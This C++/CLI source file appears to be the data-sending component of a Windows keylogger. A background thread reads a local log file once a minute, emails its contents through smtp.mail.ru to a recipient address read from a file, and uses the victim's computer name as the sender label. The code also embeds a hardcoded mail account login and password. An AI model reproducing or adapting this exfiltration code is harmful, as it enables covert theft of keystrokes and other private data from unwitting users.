#include "header.h"

MSG message;
BOOL isLastSend = true;

void msgLoop()
{
	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

static void SendCompletedCallback(Object^ sender, AsyncCompletedEventArgs^ e)
{
	// Get the unique identifier for this asynchronous 
	// operation.
	String^ token = (String^)e->UserState;
	if (e->Cancelled)
	{
		isLastSend = false;
		//Console::WriteLine("[{0}] Send canceled.", token);
	}
	if (e->Error != nullptr)
	{
		isLastSend = false;
		Console::WriteLine("[{0}] {1}", token,
			e->Error->ToString());
	}
	else
	{
		isLastSend = true;
		Console::WriteLine("Message sent.");
	}
	mailSent = true;
}
unsigned _stdcall sendFileFun(void* pArguments)
{
	SmtpClient^ client = gcnew SmtpClient("smtp.mail.ru", 25);
	client->EnableSsl = true;
	client->DeliveryMethod = SmtpDeliveryMethod::Network;
	client->Credentials = gcnew System::Net::NetworkCredential("testforname@mail.ru", "chidori67");
	MailAddress^ from = gcnew MailAddress("testforname@mail.ru",Global::nameComp, System::Text::Encoding::UTF8);
	MailAddress^ to = gcnew MailAddress(Global::recPost);
	MailMessage^ message = gcnew MailMessage(from, to);
	while (stopThreadSendMail) {
		std::ifstream log(logName, std::ios::app); //opens log file	
		std::string* content = new std::string(std::istreambuf_iterator<char>(log), std::istreambuf_iterator<char>());
		log.close();
		if (log.tellg() >= 850 && (BOOL)isLastSend) {
			std::ofstream logg(logName, std::ios::trunc);
			logg.close();
		}
		message->Body = gcnew String(content->c_str());
		message->BodyEncoding = System::Text::Encoding::UTF8;
		client->SendCompleted += gcnew	SendCompletedEventHandler(SendCompletedCallback);
		String^ userState = "test message1";
		client->SendAsync(message, userState);
		Thread::Sleep(5000);
		if (mailSent == false)
		{
			client->SendAsyncCancel();
		}
		message->Body = nullptr;
		Thread::Sleep(60000);
	}
	client = nullptr;
	delete message;
	_endthreadex(0);
	return 0;
}

void toPostAnother(char* addr)
{
	if (std::strlen(addr) != 0) {
		std::ofstream log(nPostFile, std::ios::trunc); //opens file with post rec
		log << addr << std::endl;
		log.close();
	}
	char temppost[50];
	std::ifstream logg(nPostFile, std::ios::app);
	logg.getline(temppost, 50);
	if (!temppost[0]) {
		logg.close();
		return;
	}
	Global::recPost = gcnew System::String(temppost);
	logg.close();
}

void getCompName()
{
	setlocale(0, "");
	char buffer[256];
	DWORD size = 256;
	GetComputerNameA(buffer, &size);
	Global::nameComp = gcnew System::String(buffer);
}
